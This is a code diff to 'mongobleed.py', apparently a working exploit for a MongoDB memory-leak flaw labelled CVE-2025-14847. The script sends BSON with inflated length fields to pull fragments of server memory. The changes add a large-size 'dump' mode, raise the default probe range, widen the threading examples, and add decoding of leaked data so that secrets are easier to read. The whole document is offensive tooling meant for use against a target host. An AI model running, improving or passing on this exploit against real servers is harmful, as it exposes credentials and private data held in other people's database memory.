@@ -28,6 +28,7 @@ TYPE_RE = re.compile(rb"type (\d+)")
 URL_ENC_RE = re.compile(r"%[0-9A-Fa-f]{2}")
 UNICODE_ESC_RE = re.compile(r"\\u[0-9A-Fa-f]{4}|\\x[0-9A-Fa-f]{2}|\\[nrt\"\\\\]")
 BASE64_RE = re.compile(r"^[A-Za-z0-9+/]+={0,2}$")
+SIZE_RE = re.compile(r"^\s*(\d+)\s*(kb|mb)?\s*$", re.IGNORECASE)
 
 def send_probe(host, port, doc_len, buffer_size, timeout):
     """Send crafted BSON with inflated document length"""
@@ -93,18 +94,36 @@ def extract_leaks(response):
     return leaks
 
 def main():
-    parser = argparse.ArgumentParser(description='CVE-2025-14847 MongoDB Memory Leak')
+    examples = (
+        "Examples:\n"
+        "  python3 mongobleed.py --host <target>\n"
+        "  python3 mongobleed.py --host <target> --min-offset 20 --max-offset 8192\n"
+        "  python3 mongobleed.py --host <target> --loop\n"
+        "  python3 mongobleed.py --host <target> --loop --max-empty-passes 3\n"
+        "  python3 mongobleed.py --host <target> --loop --timeout 3 --workers 200\n"
+        "  python3 mongobleed.py --host <target> --dump 10MB\n"
+        "  python3 mongobleed.py --host <target> --dump 10MB --dump-window 2048\n"
+        "  python3 mongobleed.py --host <target> --dump 512KB --preview-bytes 4096 --decode\n"
+        "  python3 mongobleed.py --host <target> --min-offset 100 --max-offset 20000\n"
+    )
+    parser = argparse.ArgumentParser(
+        description='CVE-2025-14847 MongoDB Memory Leak',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=examples,
+    )
     parser.add_argument('--host', default='localhost', help='Target host')
     parser.add_argument('--port', type=int, default=27017, help='Target port')
     parser.add_argument('--min-offset', type=int, default=20, help='Min doc length')
-    parser.add_argument('--max-offset', type=int, default=8192, help='Max doc length')
-    parser.add_argument('--buffer-bump', type=int, default=500, help='Extra bytes for claimed buffer size')
+    parser.add_argument('--max-offset', type=int, default=1048576, help='Max doc length')
+    parser.add_argument('--buffer-extra', type=int, default=500, help='Extra bytes for claimed buffer size')
     parser.add_argument('--timeout', type=float, default=2.0, help='Socket timeout in seconds')
     parser.add_argument('--workers', type=int, default=max(4, (os.cpu_count() or 4) * 10), help='Thread count')
     parser.add_argument('--preview-bytes', type=int, default=80, help='Bytes to show in console preview')
     parser.add_argument('--max-empty-passes', type=int, default=1, help='Stop after N passes with no new leaks')
     parser.add_argument('--loop', action='store_true', help='Keep looping until stopped')
     parser.add_argument('--decode', action='store_true', help='Try to decode URL, unicode escapes, and base64')
+    parser.add_argument('--dump', help='Target claimed size, e.g. 10MB or 512KB')
+    parser.add_argument('--dump-window', type=int, default=0, help='Probe +/- N bytes around dump size')
     parser.add_argument('--output', default=None, help='Output file (default: auto-generated)')
     args = parser.parse_args()
 
@@ -138,6 +157,12 @@ def main():
             return False
         printable = sum(1 for ch in text if ch.isprintable())
         return (printable / len(text)) >= 0.7
+
+    def printable_ratio(text):
+        if not text:
+            return 0.0
+        printable = sum(1 for ch in text if ch.isprintable())
+        return printable / len(text)
 
     def render_clean_text(text):
         out = []
@@ -195,6 +220,47 @@ def main():
 
         return variants
 
+    def decode_from_preview(preview, limit):
+        try:
+            decoded = codecs.decode(preview, "unicode_escape")
+        except Exception:
+            return None
+        cleaned = render_clean_text(decoded)
+        if len(cleaned) > limit:
+            cleaned = truncate_text(cleaned, limit)
+        if printable_ratio(cleaned) > printable_ratio(preview):
+            return cleaned
+        return None
+
+    def parse_size(value):
+        if value is None:
+            return None
+        if isinstance(value, int):
+            return value
+        match = SIZE_RE.match(str(value))
+        if not match:
+            raise ValueError(f"Invalid size: {value}")
+        amount = int(match.group(1))
+        unit = (match.group(2) or "").lower()
+        if unit == "kb":
+            return amount * 1024
+        if unit == "mb":
+            return amount * 1024 * 1024
+        return amount
+
+    if args.dump:
+        target = parse_size(args.dump)
+        window = max(0, args.dump_window)
+        args.min_offset = max(0, target - window)
+        args.max_offset = target + window + 1
+        args.buffer_extra = 0
+        args.loop = False
+        args.max_empty_passes = 1
+        if window:
+            console.print(f"[bold cyan][*][/bold cyan] Dump mode: {target} bytes (window +/- {window})")
+        else:
+            console.print(f"[bold cyan][*][/bold cyan] Dump mode: {target} bytes")
+
     if not args.output:
         ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
         safe_host = re.sub(r"[^A-Za-z0-9._-]+", "_", args.host)
@@ -222,7 +288,7 @@ def main():
             args.host,
             args.port,
             doc_len,
-            doc_len + args.buffer_bump,
+            doc_len + args.buffer_extra,
             args.timeout,
         )
         return doc_len, extract_leaks(response)
@@ -251,6 +317,10 @@ def main():
                                 variants = decode_variants(data, args.preview_bytes * 2)
                                 if variants:
                                     preview = " | ".join(variants)
+                                else:
+                                    cleaned = decode_from_preview(preview, args.preview_bytes * 2)
+                                    if cleaned:
+                                        preview = cleaned
                             console.print(f"[green][+][/green] offset={doc_len:4d} len={len(data):4d}: {preview}")
         if args.loop:
             console.print(f"[bold cyan][*][/bold cyan] Pass {pass_num} complete, new fragments: {new_in_pass}")
